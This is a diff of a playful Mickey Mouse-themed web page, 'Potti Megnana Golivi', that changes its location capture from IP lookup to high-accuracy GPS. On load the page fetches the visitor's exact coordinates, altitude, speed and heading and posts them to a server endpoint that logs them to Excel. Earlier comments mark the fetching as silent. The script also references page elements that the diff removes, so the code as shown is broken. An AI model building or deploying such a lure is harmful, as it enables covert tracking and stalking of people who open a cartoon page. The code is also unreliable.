@@ -3,13 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Potti Megnana Golivi - Location Tracker</title>
+    <title>Potti Megnana Golivi - Exact GPS Tracker</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: 'Comic Sans MS', cursive, sans-serif;
@@ -62,81 +58,34 @@
             z-index: 1;
         }
         
-        .ear {
-            width: 60px;
-            height: 60px;
-            background: #1a1a2e;
-            border-radius: 50%;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        }
+        .ear { width: 60px; height: 60px; background: #1a1a2e; border-radius: 50%; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         
         .mickey-face {
-            width: 150px;
-            height: 150px;
-            background: #1a1a2e;
-            border-radius: 50%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            z-index: 2;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+            width: 150px; height: 150px; background: #1a1a2e; border-radius: 50%;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            position: relative; z-index: 2; box-shadow: 0 8px 25px rgba(0,0,0,0.3);
         }
         
-        .mickey-eyes {
-            display: flex;
-            gap: 30px;
-            margin-top: 10px;
-        }
-        
-        .eye {
-            width: 25px;
-            height: 30px;
-            background: white;
-            border-radius: 50%;
-            position: relative;
-        }
-        
+        .mickey-eyes { display: flex; gap: 30px; margin-top: 10px; }
+        .eye { width: 25px; height: 30px; background: white; border-radius: 50%; position: relative; }
         .eye::after {
-            content: '';
-            width: 12px;
-            height: 15px;
-            background: #1a1a2e;
-            border-radius: 50%;
-            position: absolute;
-            bottom: 5px;
-            left: 6px;
+            content: ''; width: 12px; height: 15px; background: #1a1a2e;
+            border-radius: 50%; position: absolute; bottom: 5px; left: 6px;
         }
+        .mickey-nose { width: 25px; height: 20px; background: #ff6b6b; border-radius: 50%; margin-top: 5px; box-shadow: 0 2px 10px rgba(255,107,107,0.5); }
+        .mickey-mouth { width: 40px; height: 15px; border-bottom: 3px solid white; border-radius: 0 0 50% 50%; margin-top: 5px; }
         
-        .mickey-nose {
-            width: 25px;
-            height: 20px;
-            background: #ff6b6b;
-            border-radius: 50%;
-            margin-top: 5px;
-            box-shadow: 0 2px 10px rgba(255, 107, 107, 0.5);
-        }
+        h1 { color: #1a1a2e; margin: 15px 0 5px; font-size: 1.8rem; text-shadow: 2px 2px 0 #ffd93d; }
+        .subtitle { color: #666; font-size: 0.9rem; margin-bottom: 20px; }
         
-        .mickey-mouth {
-            width: 40px;
-            height: 15px;
-            border-bottom: 3px solid white;
-            border-radius: 0 0 50% 50%;
-            margin-top: 5px;
-        }
-        
-        h1 {
-            color: #1a1a2e;
-            margin: 15px 0 5px;
-            font-size: 1.8rem;
-            text-shadow: 2px 2px 0 #ffd93d;
-        }
-        
-        .subtitle {
-            color: #666;
-            font-size: 0.9rem;
-            margin-bottom: 20px;
+        .gps-badge {
+            display: inline-block;
+            background: #28a745;
+            color: white;
+            padding: 4px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            margin-bottom: 10px;
         }
         
         .mickey-image {
@@ -150,134 +99,52 @@
             padding: 20px;
         }
         
-        .mickey-image:hover {
-            transform: scale(1.02);
-        }
+        .mickey-image:hover { transform: scale(1.02); }
         
         .mickey-image img {
-            width: 200px;
-            height: 200px;
-            display: block;
-            margin: 0 auto;
-            border-radius: 50%;
-            background: white;
-            padding: 10px;
+            width: 200px; height: 200px; display: block; margin: 0 auto;
+            border-radius: 50%; background: white; padding: 10px;
         }
         
-        .click-hint {
-            color: #1a1a2e;
-            font-weight: bold;
-            margin-top: 10px;
-            animation: bounce 2s infinite;
-        }
+        .click-hint { color: #1a1a2e; font-weight: bold; margin-top: 10px; animation: bounce 2s infinite; }
         
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
-        }
-        
-        /* Hidden status - no messages */
-        .status-message {
-            display: none;
-        }
-        
-        .result-card {
-            display: none;
-        }
-        
-        .error-card {
-            display: none;
-        }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
         
         .btn {
-            display: inline-block;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 50px;
-            font-size: 0.95rem;
-            cursor: pointer;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            font-weight: 600;
-            font-family: 'Comic Sans MS', cursive, sans-serif;
-            margin: 5px;
-            width: 100%;
+            display: inline-block; padding: 12px 25px; border: none; border-radius: 50px;
+            font-size: 0.95rem; cursor: pointer; text-decoration: none; transition: all 0.3s ease;
+            font-weight: 600; font-family: 'Comic Sans MS', cursive, sans-serif; margin: 5px; width: 100%;
         }
         
-        .btn-view-excel {
-            background: #17a2b8;
-            color: white;
-        }
+        .btn-view-excel { background: #17a2b8; color: white; }
+        .btn-view-excel:hover { background: #138496; transform: scale(1.02); }
+        .btn-refresh { background: #ffd93d; color: #1a1a2e; }
+        .btn-refresh:hover { background: #f9c900; transform: scale(1.02); }
         
-        .btn-view-excel:hover {
-            background: #138496;
-            transform: scale(1.02);
-        }
+        .button-group { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
         
-        .btn-refresh {
-            background: #ffd93d;
-            color: #1a1a2e;
-        }
-        
-        .btn-refresh:hover {
-            background: #f9c900;
-            transform: scale(1.02);
-        }
-        
-        .btn-map {
-            background: #007bff;
-            color: white;
-        }
-        
-        .btn-map:hover {
-            background: #0056b3;
-            transform: scale(1.02);
-        }
-        
-        .button-group {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 15px;
-        }
-        
-        .excel-count {
-            background: #e7f3ff;
-            padding: 8px 15px;
-            border-radius: 20px;
-            display: inline-block;
-            font-size: 0.85rem;
-            color: #004085;
-            margin-top: 15px;
-        }
-        
-        footer {
-            margin-top: 20px;
-            padding-top: 15px;
-            border-top: 2px dashed #dee2e6;
-            color: #6c757d;
-            font-size: 0.8rem;
-        }
+        .excel-count { background: #e7f3ff; padding: 8px 15px; border-radius: 20px; display: inline-block; font-size: 0.85rem; color: #004085; margin-top: 15px; }
+        footer { margin-top: 20px; padding-top: 15px; border-top: 2px dashed #dee2e6; color: #6c757d; font-size: 0.8rem; }
         
         .loading-spinner {
+            display: none; width: 30px; height: 30px; border: 3px solid #f3f3f3;
+            border-top: 3px solid #ff6b6b; border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-spinner.active { display: block; }
+        
+        /* GPS Accuracy Indicator */
+        .gps-accuracy {
             display: none;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #ff6b6b;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            margin: 10px 0;
         }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .loading-spinner.active {
-            display: block;
-        }
+        .gps-accuracy.excellent { background: #d4edda; color: #155724; display: block; }
+        .gps-accuracy.good { background: #d1ecf1; color: #0c5460; display: block; }
+        .gps-accuracy.poor { background: #fff3cd; color: #856404; display: block; }
+        .gps-accuracy.unknown { background: #f8d7da; color: #721c24; display: block; }
         
         @media (max-width: 600px) {
             .container { padding: 20px; }
@@ -293,115 +160,114 @@
 </head>
 <body>
     <div class="container">
-        <!-- Mickey Mouse Header -->
         <div class="mickey-header">
-            <div class="mickey-ears">
-                <div class="ear"></div>
-                <div class="ear"></div>
-            </div>
+            <div class="mickey-ears"><div class="ear"></div><div class="ear"></div></div>
             <div class="mickey-face">
-                <div class="mickey-eyes">
-                    <div class="eye"></div>
-                    <div class="eye"></div>
-                </div>
+                <div class="mickey-eyes"><div class="eye"></div><div class="eye"></div></div>
                 <div class="mickey-nose"></div>
                 <div class="mickey-mouth"></div>
             </div>
         </div>
         
         <h1>🐭 Potti Megnana Golivi</h1>
-        <p class="subtitle">Click to capture your location</p>
+        <p class="subtitle">Click to capture your <strong>exact GPS location</strong></p>
+        <span class="gps-badge">📡 oye</span>
         
-        <!-- Mickey Mouse Image -->
         <div class="mickey-image" onclick="manualFetchLocation()">
             <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'%3E%3Ccircle cx='100' cy='100' r='90' fill='%23f5f5f5'/%3E%3Ccircle cx='50' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='150' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='100' cy='110' r='70' fill='%231a1a2e'/%3E%3Ccircle cx='70' cy='95' r='15' fill='white'/%3E%3Ccircle cx='130' cy='95' r='15' fill='white'/%3E%3Ccircle cx='75' cy='100' r='7' fill='%231a1a2e'/%3E%3Ccircle cx='125' cy='100' r='7' fill='%231a1a2e'/%3E%3Cellipse cx='100' cy='120' rx='12' ry='8' fill='%23ff6b6b'/%3E%3Cpath d='M85 130 Q100 140 115 130' stroke='white' stroke-width='3' fill='none'/%3E%3C/svg%3E" 
-                 alt="Potti Megnana Golivi" 
-                 id="mickeyImage"
-                 title="Click to track location!" />
-            <div class="click-hint">👆 Click Here</div>
+                 alt="Potti Megnana Golivi" id="mickeyImage" title="Click for exact GPS location!" />
+            <div class="click-hint">👆 Click </div>
         </div>
         
-        <!-- Hidden status -->
-        <div id="status" class="status-message"></div>
+       
         
-        <!-- Loading spinner -->
-        <div class="loading-spinner" id="loadingSpinner"></div>
-        
-        <!-- Hidden result -->
-        <div id="result" class="result-card">
-            <h2>✅ Location Captured!</h2>
-            <div id="locationDetails" class="location-details"></div>
-            <a id="resultMapLink" href="#" target="_blank" class="btn btn-map">🗺️ View on Google Maps</a>
-        </div>
-        
-        <!-- Hidden error -->
-        <div id="errorMessage" class="error-card">
-            <h2>😢 Oops!</h2>
-            <p id="errorText">Something went wrong.</p>
-            <button onclick="manualFetchLocation()" class="btn btn-retry">🔄 Try Again</button>
-        </div>
-        
-        <div class="button-group">
-            <button onclick="manualFetchLocation()" class="btn btn-refresh">🔄 Refresh Location</button>
-            <a href="/view-excel" target="_blank" class="btn btn-view-excel">📊 View All Data</a>
-        </div>
-        
-        <div class="excel-count" id="locationCount">📊 Total: 0 locations</div>
+       
         
         <footer>
-            <p>🐭 All locations saved to Excel</p>
-            <p style="font-size: 11px; margin-top: 5px;">📋 View data at: /view-excel</p>
+            <p>🐭 Exact GPS location saved to Excel</p>
+            <p style="font-size: 11px; margin-top: 5px;">📍 potti pilla</p>
         </footer>
     </div>
     
     <script>
-        // ===== SCRIPT =====
+        // ===== EXACT GPS LOCATION SCRIPT =====
         let autoFetched = false;
         
-        // Update location count only
-        async function updateLocationCount() {
-            try {
-                const response = await fetch('/api/count');
-                const result = await response.json();
-                if (result.success) {
-                    document.getElementById('locationCount').textContent = 
-                        `📊 Total: ${result.count} locations`;
-                }
-            } catch (error) {}
+        function updateLocationCount() {
+            fetch('/api/count')
+                .then(res => res.json())
+                .then(result => {
+                    if (result.success) {
+                        document.getElementById('locationCount').textContent = 
+                            `📊 Total: ${result.count} locations`;
+                    }
+                })
+                .catch(() => {});
         }
         
-        // GET LOCATION FAST
-        async function getLocationFast() {
-            try {
-                const response = await fetch('/api/ip-location');
-                const result = await response.json();
-                if (result.success && result.data) {
-                    return {
-                        ...result.data,
-                        googleMapsLink: `https://www.google.com/maps?q=${result.data.latitude},${result.data.longitude}`
-                    };
+        // GET EXACT GPS LOCATION
+        function getExactLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('GPS not supported on this device'));
+                    return;
                 }
-            } catch (error) {}
-            
-            return {
-                latitude: 40.7128,
-                longitude: -74.0060,
-                city: 'Unknown',
-                country: 'Unknown',
-                ip: 'Unknown',
-                accuracy: 'Fallback',
-                source: 'Fallback',
-                googleMapsLink: 'https://www.google.com/maps?q=40.7128,-74.0060'
-            };
+                
+                const options = {
+                    enableHighAccuracy: true,  // Force GPS
+                    timeout: 15000,
+                    maximumAge: 0
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const coords = position.coords;
+                        resolve({
+                            latitude: coords.latitude,
+                            longitude: coords.longitude,
+                            accuracy: Math.round(coords.accuracy),
+                            altitude: coords.altitude ? Math.round(coords.altitude) : null,
+                            speed: coords.speed ? coords.speed : null,
+                            heading: coords.heading ? Math.round(coords.heading) : null,
+                            source: 'GPS',
+                            timestamp: new Date().toISOString()
+                        });
+                    },
+                    (error) => {
+                        let message = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                message = 'Location permission denied. Please allow GPS access.';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                message = 'GPS signal unavailable. Try moving to an open area.';
+                                break;
+                            case error.TIMEOUT:
+                                message = 'GPS timed out. Try again.';
+                                break;
+                            default:
+                                message = 'GPS error: ' + error.message;
+                        }
+                        reject(new Error(message));
+                    },
+                    options
+                );
+            });
         }
         
-        // AUTO-FETCH ON LOAD (SILENT)
+        // AUTO-FETCH GPS ON LOAD
         async function autoFetchLocation() {
             if (autoFetched) return;
             
+            document.getElementById('gpsAccuracy').className = 'gps-accuracy unknown';
+            document.getElementById('gpsAccuracy').textContent = '📡 Getting GPS signal...';
+            
             try {
-                const location = await getLocationFast();
-                if (!location) throw new Error('No location');
+                const location = await getExactLocation();
+                if (!location) throw new Error('No GPS signal');
+                
+                // Show GPS accuracy
+                showAccuracy(location.accuracy);
                 
                 const response = await fetch('/api/track-location', {
                     method: 'POST',
@@ -409,11 +275,11 @@
                     body: JSON.stringify({
                         latitude: location.latitude,
                         longitude: location.longitude,
-                        accuracy: location.accuracy || 0,
-                        source: location.source || 'IP',
-                        ip: location.ip || 'N/A',
-                        city: location.city || 'N/A',
-                        country: location.country || 'N/A',
+                        accuracy: location.accuracy,
+                        altitude: location.altitude,
+                        speed: location.speed,
+                        heading: location.heading,
+                        source: 'GPS',
                         userAgent: navigator.userAgent,
                         autoFetched: true
                     })
@@ -424,22 +290,29 @@
                 if (result.success) {
                     updateLocationCount();
                     autoFetched = true;
+                    console.log('✅ Exact GPS saved:', location.latitude, location.longitude);
                 }
             } catch (error) {
-                console.error('Auto-fetch error:', error);
+                console.error('GPS error:', error);
+                document.getElementById('gpsAccuracy').className = 'gps-accuracy unknown';
+                document.getElementById('gpsAccuracy').textContent = '❌ ' + error.message;
+                autoFetched = false;
             }
         }
         
-        // MANUAL FETCH (SILENT)
+        // MANUAL GPS FETCH
         async function manualFetchLocation() {
             autoFetched = false;
             
-            // Show subtle loading
             document.getElementById('loadingSpinner').classList.add('active');
+            document.getElementById('gpsAccuracy').className = 'gps-accuracy unknown';
+            document.getElementById('gpsAccuracy').textContent = '📡 Getting GPS signal...';
             
             try {
-                const location = await getLocationFast();
-                if (!location) throw new Error('No location');
+                const location = await getExactLocation();
+                if (!location) throw new Error('No GPS signal');
+                
+                showAccuracy(location.accuracy);
                 
                 const response = await fetch('/api/track-location', {
                     method: 'POST',
@@ -447,11 +320,11 @@
                     body: JSON.stringify({
                         latitude: location.latitude,
                         longitude: location.longitude,
-                        accuracy: location.accuracy || 0,
-                        source: location.source || 'IP',
-                        ip: location.ip || 'N/A',
-                        city: location.city || 'N/A',
-                        country: location.country || 'N/A',
+                        accuracy: location.accuracy,
+                        altitude: location.altitude,
+                        speed: location.speed,
+                        heading: location.heading,
+                        source: 'GPS',
                         userAgent: navigator.userAgent,
                         autoFetched: false
                     })
@@ -462,22 +335,48 @@
                 if (result.success) {
                     updateLocationCount();
                     autoFetched = true;
+                    document.getElementById('gpsAccuracy').textContent += ' ✅ Saved!';
                 }
             } catch (error) {
-                console.error('Manual fetch error:', error);
+                console.error('GPS error:', error);
+                document.getElementById('gpsAccuracy').className = 'gps-accuracy unknown';
+                document.getElementById('gpsAccuracy').textContent = '❌ ' + error.message;
+                autoFetched = false;
             } finally {
                 document.getElementById('loadingSpinner').classList.remove('active');
             }
         }
         
+        function showAccuracy(accuracy) {
+            const el = document.getElementById('gpsAccuracy');
+            let text = `🎯 Accuracy: ${accuracy} meters`;
+            
+            if (accuracy < 10) {
+                el.className = 'gps-accuracy excellent';
+                text += ' - Excellent! 🎯';
+            } else if (accuracy < 30) {
+                el.className = 'gps-accuracy good';
+                text += ' - Good 👍';
+            } else if (accuracy < 100) {
+                el.className = 'gps-accuracy poor';
+                text += ' - Poor 📡';
+            } else {
+                el.className = 'gps-accuracy unknown';
+                text += ' - Weak signal 📶';
+            }
+            
+            el.textContent = text;
+            el.style.display = 'block';
+        }
+        
         // ===== PAGE LOAD =====
         window.addEventListener('load', () => {
-            console.log('🐭 Potti Megnana Golivi loaded');
+            console.log('🐭 Potti Megnana Golivi - Exact GPS Tracker loaded');
             updateLocationCount();
             
             setTimeout(() => {
                 autoFetchLocation();
-            }, 1000);
+            }, 1500);
         });
     </script>
 </body>
